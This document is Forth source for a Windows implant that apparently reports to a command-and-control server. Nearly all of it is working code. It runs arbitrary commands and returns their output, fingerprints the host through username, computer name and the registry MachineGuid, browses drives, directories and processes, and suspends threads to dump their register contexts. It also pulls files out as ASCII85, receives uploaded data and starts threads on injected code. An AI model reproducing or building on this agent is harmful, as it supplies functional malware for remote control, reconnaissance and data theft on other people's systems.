0 !echo

\ ------------------------------------------------------------------------ 
\ Gaps in the core API
\ ------------------------------------------------------------------------

\ C0 control characters for communicating with server subsystems

0  value NUL  16 value DLE 
1  value SOH  17 value DC1 
2  value STX  18 value DC2 
3  value ETX  19 value DC3 
4  value EOT  20 value DC4 
5  value ENQ  21 value NAK 
6  value ACK  22 value SYN 
7  value BEL  23 value ETB 
8  value BS   24 value CAN 
9  value HT   25 value EOM 
10 value LF   26 value SUB 
11 value VT   27 value ESC 
12 value FF   28 value FS  
13 value CR   29 value GS  
14 value SI   30 value RS  
15 value SO   31 value US  

\ Pretty-print the output

kernel32   1   dllfun SetLastError  SetLastError
kernel32   0   dllfun GetLastError  GetLastError
kernel32   1   dllfun CloseHandle   CloseHandle
kernel32   1   dllfun LoadLibrary   LoadLibraryA

' magenta value OUTCOLOR

: outcol OUTCOLOR execute ;
: +bold  ." \x1b[1m" ;
: -bold  ." \x1b[22m" ;

: loadlib readline drop LoadLibrary ;

: .err   GetLastError red ." Error! " . clear cr ;
: !err   SetLastError .err ;
: .pre   outcol -bold ." \n---- BEGIN OUTPUT ----\n" +bold ;
: .post  outcol -bold ." ----- END OUTPUT -----\n\x03" normal ;

: c->str     dup c@ 0= if over - else 1+ tail then ;
: c->str     dup c->str ;

: .cstring   c->str type ; 

: cstrcmp ( addr addr -- cmp )
  >r c->str r> c->str strcmp
;

variable len2 
: strstr ( addr u addr u -- bool )
  \ store length for convenience, save needle on return stack
  dup len2 ! 2>r

  begin
    \ while the haystack is at least as long as the needle
    dup len2 @ >= while

    \ check the len2 length string at current offset
    over 2r@ tuck stricmp 0= 

    \ if it matches, it's a substring
    if 2drop 2r> 2drop -1 return then

    \ move to next offset
    walk drop
  repeat
  2r> 2drop 2drop 0 
;

: cstrstr ( addr addr -- bool )
  \ convert to counted strings
  >r c->str r> c->str strstr
;

variable bytes

private

kernel32 1 dllfun ExitProcess ExitProcess

public{

: bye 0 ExitProcess ;

}public

\ ------------------------------------------------------------------------
\ Make some actions a little safer
\ ------------------------------------------------------------------------

: .warn +rev ." clamp to " . -rev cr ;
: clamp 1 max [ 4 1024 * lit ] min ;
: clamp dup clamp swap over <> if dup .warn then ;
: dump  clamp dump ;

\ ------------------------------------------------------------------------
\ Strings in regions of memory
\ ------------------------------------------------------------------------

private

variable binary  
variable start   
variable len     

\ initialize string finding engine
: init   binary on start off len off ;

\ test if a byte is a printable character
: print? 32 126 within ;

\ print strings when found if they're long enough
: .addr  start @ hex 16 cyan .r outcol dec ;
: .str   start @ len @ type cr ;
: .str?  len @ 4 >= if .addr .str then ;

\ track strings in memory
: track  start ! binary off 1 len ! ;
: >plain binary @ if track else drop len incr then ;
: >bin   binary @ 0= if binary on .str? then ;

public{

\ print ASCII strings in a region of memory

: strings ( address length -- )
  init .pre bounds do
    i c@ print? if i >plain else >bin then      
  loop
  .post
;

}public

\ ------------------------------------------------------------------------
\ Executing commands
\ ------------------------------------------------------------------------

\ This examples imports some Win32 functions and provides a simple interface
\ for executing processes and collecting their output.  

\ DLL    ARGS  GPA    WORD          EXPORT NAME
kernel32  10   dllfun CreateProcess CreateProcessA
kernel32   6   dllfun CreateThread  CreateThread
kernel32   1   dllfun ExitThread    ExitThread
kernel32   4   dllfun CreatePipe    CreatePipe   
kernel32   5   dllfun ReadFile      ReadFile  
kernel32   6   dllfun PeekNamedPipe PeekNamedPipe  

private

\ STARTUP_INFO struct that defines parameters for CreateProcess
create sinfo 104 allot 104 sinfo d!
: dwFlags     sinfo 60 + ;
: wShowWindow sinfo 64 + ;
: hStdInput   sinfo 80 + ;
: hStdOutput  sinfo 88 + ;
: hStdError   sinfo 96 + ;

\ PROCESS_INFO, filled out by CreateProcess in case we need it
create pinfo 24 allot
: hProcess    pinfo ;
: hThread     pinfo 8 + ;
: dwProcessId pinfo 16 + ;
: dwThreadId  pinfo 20 + ;

\ This is a small record for storing handles for a FIFO
create I/O 0 , 0 , 24 , 0 , 1 , ( inherit )
: <pipe @ ;
: >pipe 8 + @ ;

variable running 

\ To be good citizens, we close the handles.  Even if the child process has
\ closed them, they can be "re-closed" safely, so we close everything in a
\ heavy-handed fashion.

: clean.pipes
  I/O >pipe CloseHandle drop
  I/O <pipe CloseHandle drop ;
  
: clean.handles
  hProcess CloseHandle drop
  hThread  CloseHandle drop ;

: clean clean.pipes clean.handles ;

\ We might run more than one command in a session, so this will initialize
\ the sinfo struct and create a pipe for a new CreateProcess execution.
\ For safety, it has seemed like a good idea to zero out the sinfo between
\ runs.

: init.sinfo
  sinfo 4 + 100 zero
  257 dwFlags d!
  0 wShowWindow d! ;

: plumb
  init.sinfo
  I/O dup 8 + dup 8 + 0 CreatePipe drop 
  I/O >pipe hStdOutput !
  I/O >pipe hStdError ! ;

\ The key to good coordination with the child process is to close the "write"
\ side of the pipe from the parent process.  This way, when the child exits
\ it will close its reference to the HANDLE and our attempts to ReadFile from
\ this side will fail.

: /out   I/O >pipe CloseHandle drop ;

\ This just wraps up the call to CreateProcess to keep things pretty.
\ Consumes a counted string as input representing the process to execute.

: flags  1 8 or $200 or $8000000 or 10 or ;

: exec   drop 0 swap 0 0 flags 0 0 0 sinfo pinfo CreateProcess /out ;

\ Read to the end of the Pipe's lifetime.  For an infinite running process,
\ this could prevent returning control to the interpreter, so be careful!

: read   I/O <pipe here 512 bytes 0 ReadFile ;
: slurp  read if here bytes @ type tail then ;

\ Provide a friendly interface.  Will read the line after it's called in the
\ outer interpreter to get the string for CreateProcess.  This lets you do
\ pipelines or other complex calls without worrying about string escapes.

: .pinfo dwProcessId ." Started process: " . cr ;

public{

: cmd    plumb exec if running on .pre slurp .post else .err then clean ;
: !!     readline cmd ;
: !&     readline init.sinfo exec if .pre .pinfo .post else .err then clean.handles ;
: spawn  readline plumb exec if .pre .pinfo .post I/O dup <pipe swap >pipe else .err then ;

: ?handle ( handle -- bool )
  0 0 here dup cell + dup cell + PeekNamedPipe
  if here cell + @ else .err then ;

: @handle ( handle -- byte )
  pad 1 here 0 ReadFile 0=
  if .err else pad c@ then ;

: .handle ( handle -- )
  dup ?handle 0 do dup @handle emit loop drop ;

}public

\ ------------------------------------------------------------------------
\ Registry access
\ ------------------------------------------------------------------------

loadlib advapi32.dll
value advapi32

private

variable regbytes

advapi32 5 dllfun RegOpenKeyEx RegOpenKeyExA
advapi32 6 dllfun RegQueryValueEx RegQueryValueExA
advapi32 1 dllfun RegCloseKey RegCloseKey

public{

: HKLM      [ $ffffffff80000002 litq ] ;
: KEY_READ  [ $20019 lit ] ;

: regopen ( key addr u -- handle )
  drop 0 KEY_READ here RegOpenKeyEx drop
  here @
;

: regread ( handle addr u -- addr u )
  4096 regbytes !
  drop 0 0 here regbytes RegQueryValueEx drop
  here regbytes @ ;

: regclose ( handle -- )
  RegCloseKey drop ;

}public

: machineguid ( -- addr u )
  HKLM s" Software\\Microsoft\\Cryptography" regopen
  dup s" MachineGuid" regread
  rot regclose ;

\ ------------------------------------------------------------------------
\ View environment variables
\ ------------------------------------------------------------------------

kernel32 0 dllfun GetEnvironmentStrings GetEnvironmentStrings
kernel32 3 dllfun GetEnvironmentVariable GetEnvironmentVariableA
kernel32 2 dllfun SetEnvironmentVariable SetEnvironmentVariableA

private

variable z?
variable done?

\ maximum size of environment in Win32
32768 allocate value ENVSPACE

: (walk)   dup c@ >r 1+ r> ;
: handle0  drop z? @ if done? on else z? on cr then ;
: handle   if z? off emit else handle0 then ;
: output   done? @ if drop else (walk) dup handle tail then ;

public{

: .ctable  done? off z? off .pre output .post ;
: @env     drop ENVSPACE 32768 GetEnvironmentVariable if ENVSPACE else 0 then ;
: getenv*  GetEnvironmentStrings dup if .ctable then ;
: getenv   readline @env
	   if .pre ENVSPACE .cstring cr .post 
	   else .err then ;

: setenv   
  word \0term drop readline drop
  SetEnvironmentVariable 
  if .pre ." Success\n" .post else .err then
;

}public

: ident
  .pre
  ." IDENT:"
  s" USERNAME" @env .cstring ." @"
  s" COMPUTERNAME" @env .cstring ." ."
  s" USERDOMAIN" @env dup if .cstring else drop then ." :"
  machineguid type cr
  .post
;

\ ------------------------------------------------------------------------
\ Interact with filesystem and other environment aspects
\ ------------------------------------------------------------------------

private

kernel32 2 dllfun GCD GetCurrentDirectoryA
kernel32 1 dllfun SetCurrentDirectory SetCurrentDirectoryA
kernel32 0 dllfun GetCurrentProcessId GetCurrentProcessId
kernel32 2 dllfun GetLogicalDriveStrings GetLogicalDriveStringsA
kernel32 2 dllfun FindFirstVolume FindFirstVolumeA
kernel32 3 dllfun FindNextVolume FindNextVolumeA

: >vol  here 1024 FindNextVolume ;
: lsvol here .cstring cr dup >vol if tail then CloseHandle drop ;
: lsvol here 1024 FindFirstVolume lsvol ;

public{

: cd  readline drop SetCurrentDirectory if .pre ." Success\n" .post else .err then ;
: pwd here 1024 over GCD .pre type cr .post ;
: pid GetCurrentProcessId ;
: lsvol .pre lsvol .post ;
: lsdrives 1024 here GetLogicalDriveStrings if here .ctable else .err then ;

}public

\ ------------------------------------------------------------------------
\ Listing directory contents
\ ------------------------------------------------------------------------

private

create WIN32_FIND_DATA 8 cells 256 + 14 + allot
variable HANDLE

kernel32 2 dllfun FindFirstFile FindFirstFileA
kernel32 2 dllfun FindNextFile  FindNextFileA
kernel32 1 dllfun FindClose     FindClose

: find-first drop WIN32_FIND_DATA FindFirstFile dup HANDLE ! ;
: find-next  HANDLE @ WIN32_FIND_DATA FindNextFile ;

: .file ( ugly, as formatting strings always is... )
  outcol -bold WIN32_FIND_DATA dup
  20 + SYSTEMTIME FileTimeToSystemTime drop SYSTEMTIME .time dup
  28 + dup d@ 32 << swap 4 + d@ + 16 .>r space dup
  d@ 16 and +bold if green then dup
  44 + .cstring dup
  d@ 16 and if outcol ." /" then 
  cr drop
;

: ls ( handle -- )
  find-next if
    .file tail
  then ;

public{ 

: ls ( addr u -- )
  find-first 0 > if
    .pre .file ls .post
    HANDLE @ FindClose drop
  else
    .err
  then ;

: dir  s" *" ls ;
: ls   readline ls ;

}public


kernel32 2 dllfun GetComputerName GetComputerNameA

: @hostname 1024 bytes ! here bytes GetComputerName >r here r> ;
: hostname  @hostname if .pre .cstring cr .post else .err then ;

\ ------------------------------------------------------------------------
\ Load a file into memory
\ ------------------------------------------------------------------------

private
kernel32 2 dllfun GetFileSize GetFileSize
kernel32 7 dllfun CreateFile CreateFileA
kernel32 5 dllfun ReadFile ReadFile

: loadfile
  drop $80000000 7 0 3 0 0 CreateFile
  dup 0 >= if 
    dup here dup >r GetFileSize r> d@ $40 << + ( HANDLE size )
    over >r dup >r dup allocate dup >r       ( HANDLE size addr r:HANDLE size addr )
    swap here 0 ReadFile drop               ( r: HANDLE size addr )
    r> r> r>                               ( addr size HANDLE )
    CloseHandle drop -1                    ( addr size )
  else
    cr .err cr 0
  then 
;
public

private

\ an ASCII85 encoder so we can view binary files
variable a85acc
variable region
variable len

: shift    256 a85acc *! ;       \ we add a byte at a time
: output   a85acc @ 256 / ;       \ take off last byte
: convert  4 0 do 85 /mod loop ;   \ turn u32 into base-85 nums
: encode   5 0 do 33 + emit loop ;  \ print values in A85 char space
: next     dup if walk else 0 then ; \ grab next byte (0 after EOS)

\ extract a 4-byte chunk as 32-bit int
: chunk    a85acc off 4 0 do next a85acc +! shift loop output ;

: fileop   >r readline loadfile if 2dup .pre r> execute .post drop free then ;

\ now for decoding, same steps in reverse
: /next    dup if walk dup 33 < if drop tail then dup 117 > if drop tail then else 33 then ;
: /store   region @ len @ + c! 1 len +! ;
: /output  a85acc @ 4 0 do dup 3 i - cells >> 255 and /store loop drop ;
: /chunk   a85acc off 5 0 do 
	     /next 33 -    \ get next char and convert to base85 number
	     85 a85acc *!   \ shift accumulator by one base85 digit
	     a85acc +!       \ add the current amount
	   loop /output ;

: decode   dup if /chunk tail then 2drop ;

public{

\ encode all chunks in string
: ascii85   dup if chunk dup if convert encode else drop [char] z emit then tail then 2drop cr ;     

: /ascii85 
  dup allocate region ! len off decode region @ len @ ;

: cat      ['] type fileop ;
: download ['] ascii85 fileop ;

\ preliminary test of getting binary data up to the compiler
: upload
  ." Paste A85-encoded text: " readline
  /ascii85 2dup .pre type .post
  drop free ;

}public

\ ------------------------------------------------------------------------
\ An interface for listing processes and current status of threads
\ ------------------------------------------------------------------------

private

kernel32 2 dllfun CreateToolhelp32Snapshot CreateToolhelp32Snapshot
kernel32 2 dllfun Process32First Process32First
kernel32 2 dllfun Process32Next Process32Next
kernel32 2 dllfun Thread32First Thread32First 
kernel32 2 dllfun Thread32Next Thread32Next
kernel32 3 dllfun OpenProcess OpenProcess
kernel32 3 dllfun OpenThread  OpenThread
kernel32 1 dllfun SuspendThread SuspendThread
kernel32 1 dllfun ResumeThread ResumeThread
kernel32 2 dllfun GetThreadContext GetThreadContext

hex
: PROCESS_ALL_ACCESS 1f0fff ;
: THREAD_ALL_ACCESS  1f03ff ;

: TH32CS_INHERIT      80000000 ;
: TH32CS_SNAPALL             0 ;
: TH32CS_SNAPHEAPLIST        1 ;
: TH32CS_SNAPMODULE          8 ;
: TH32CS_SNAPMODULE32       10 ;
: TH32CS_SNAPPROCESS         2 ;
: TH32CS_SNAPTHREAD          4 ;
dec

create TOOLMEM 304 allot

: set-snapprocess TOOLMEM 304 over ! dup 8 + 296 zero ;
: set-snapthreads TOOLMEM 28  over ! dup 8 + 20  zero ;

variable TOOLXT
variable TOOLHD
variable TOOLset
variable TOOL1st
variable TOOLnxt

: *tool32
  TOOLMEM TOOLXT @ execute
  TOOLHD @ TOOLset @ execute TOOLnxt @ execute
  if tail then ;

: *tool32
  TOOLXT !
  TOOLHD @ TOOLset @ execute TOOL1st @ execute if
    *tool32
    TOOLHD @ CloseHandle drop
  else
    .err
  then ;

: *tool32 ( eachxt nextxt firstxt setupxt snap )
  0 CreateToolhelp32Snapshot TOOLHD !
  TOOLset !
  TOOL1st !
  TOOLnxt !
  *tool32 ;

: *threads ( xt )
  ['] Thread32Next
  ['] Thread32First
  ['] set-snapthreads
  TH32CS_SNAPTHREAD
  *tool32 ;

: *processes ( xt )
  ['] Process32Next
  ['] Process32First
  ['] set-snapprocess
  TH32CS_SNAPPROCESS
  *tool32 ;

variable PID

create CONTEXT align here 1232 allot does> drop [ rot litq ] ;

: CONTEXT_CONTROL 1 ;
: CONTEXT_INTEGER 2 ;
: CONTEXT_ALL $10001f ; 

: >CONTEXT 
  CONTEXT dup 1232 zero 
  CONTEXT_ALL CONTEXT 48 + d! ;

: nq dup 8 + swap @ 18 +bold .r -bold space ;

: .context
  -bold hex 112 +
  ." Rax: " nq   ." Rcx: " nq   ." Rdx: " nq  ." Rbx: " nq cr
  ." Rsp: " nq   ." Rbp: " nq   ." Rsi: " nq  ." Rdi: " nq cr
  ." R8:  " nq   ." R9:  " nq   ." R10: " nq  ." R11: " nq cr
  ." R12: " nq   ." R13: " nq   ." R14: " nq  ." R15: " nq cr
  ." Rip: " nq   +bold cr
  dec drop ;
  
: @thread ( tid )
  THREAD_ALL_ACCESS 0 rot OpenThread dup if
    dup SuspendThread 0 >= if
      dup >CONTEXT GetThreadContext if
	CONTEXT .context
      else
	.err
      then
      dup ResumeThread 4000000000 > if
	.err ." Resume fail\n"
      then
    else
      .err 
    then
    CloseHandle drop
  else
    .err
  then ;

: .threads*
  dup 12 + d@ PID @ = if
    cyan ." Thread: "
    8 + d@ dup . cr outcol
    @thread cr
  else drop then ;

: .ps ( addr -- )
  -bold dup  8 + d@ ." PID: " 8  +bold .r 
  -bold dup 28 + d@ ." Threads: " 8  +bold .r 
  -bold dup 32 + d@ ." PPID: " 8  +bold .r 
  -bold     44 +    ." Image: " +bold .cstring cr ;


variable target
: .match ( addr -- )
  dup 44 + target @ cstrstr if .ps else drop then 
;

public{

: .threads .pre PID ! ['] .threads* *threads .post ;
: ps       .pre ['] .ps *processes .post ;
: psfind   .pre readline drop target ! ['] .match *processes .post ;

}public

\ ------------------------------------------------------------------------
\ Ability to move file data between server and agent
\ ------------------------------------------------------------------------

\ stream a sequence of data into the dictionary at 'here'
: ,stream ( count -- )
  .pre ." Reading " dup . ." bytes" cr
  0 do key c, loop
  ." Done."
  .post ;

\ ------------------------------------------------------------------------
\ Miscellaneous functions that prove useful sometimes
\ ------------------------------------------------------------------------

private

variable entry

: .flag
  case
    1 of ." ASM " endof
    2 of ." CODE" endof
    4 of ." IMM " endof
    5 of ." INL " endof
    drop ." ????"
  endcase ;

: dictmap
  .pre
  begin
    dup while
    -bold ." Addr: "   dup @ hex +bold . dec
    -bold ." F: "      dup 8 + c@ +bold .flag
    -bold ." Body: "   dup 9 + d@ 6 +bold .r
    -bold ." Off: "    dup 13 + d@ 4 +bold .r
    -bold ." Extent: " entry @ over - +bold 6 .r
    -bold ." Name: "   dup >name +bold type 
    cr dup entry ! @
  repeat .post ;

public{

: dictmap here entry ! last dictmap ;

}public

\ loadlib ws2_32.dll
\ value winsock
\ winsock 3 dllfun ioctlsocket ioctlsocket 
\ : key?     c2sock 1074030207 bytes ioctlsocket drop bytes @ ;

: ,file
  readline loadfile if .pre
    over >r                     \ remember allocated memory
    here swap dup >r move        \ set up move saving length on return stack
    r> dup ." Read " . ." bytes\n" \ provide useful output
    here + !here                    \ update end of dictionary
    r> free .post                    \ release memory from loadfile
  else
    .err \ couldn't open the file, provide error code
  then ;

: >thread ( address -- tid )
  0 0 rot 0 0 here .s CreateThread .err .s dup if
    .pre
    ." Created thread " here @ . ." with handle " . cr
    .post
  else
    .err
  then ;

: @adp 1 i,[ 65488b3c2528000000 ] ;

\ clone will run another compiler in a new thread, running the code
\ in the provided memory address.  That code is responsible to switch
\ back to the old input stream at the end (there is no length checking!)

@key value orig-key
: popinput orig-key !key ;

: clone ( code addr -- handle )
  >r 0 0 rot 24 + r> 0 here CreateThread ;

: consume  begin key? while key drop repeat ;

\ ------------------------------------------------------------------------
\ Phone home to C2 server with new outer interpreter
\ ------------------------------------------------------------------------

: help
  outcol
  cr cr
  ." !! <cmd>               Execute command (CreateProcess)\n"
  ." getenv <name>          Get value of indicated environment variable\n"
  ." getenv*                Show values of all environment variables\n"
  ." pwd                    Print working directory\n"
  ." pid                    Get current process ID\n"
  ." lsvol                  List system volumes\n"
  ." lsdrives               List logical drives\n"
  ." ls <glob>              List matching filesystem contents\n"
  ." hostname               Show hostname\n"
  ." cat <path>             Show contents of file\n"
  ." download <path>        Show file contents in ASCII85 encoding\n"
  ." help                   Show this help listing\n"
  ." ps                     List running processes\n"
  ." <pid> .threads         Show current context for threads in process\n"
  ." ident                  Show machine identity string\n"
  ." <addr> <len> strings   Find ASCII strings in memory region\n"
  ." machineguid            Display unique machine ID\n"
  cr
  clear ;  

: usage
  here dict @ - .pre ." Currently allocated " . ." bytes in dictionary\n" .post ;

: ping
  @time cr .time cyan @hostname if .cstring space else drop then ." PONG\n" clear ;

\ support code tossed in by a parent thread
: init ;
{ @adp if @adp !meminput ['] memkey !key then }!
init

mark

0 !echo

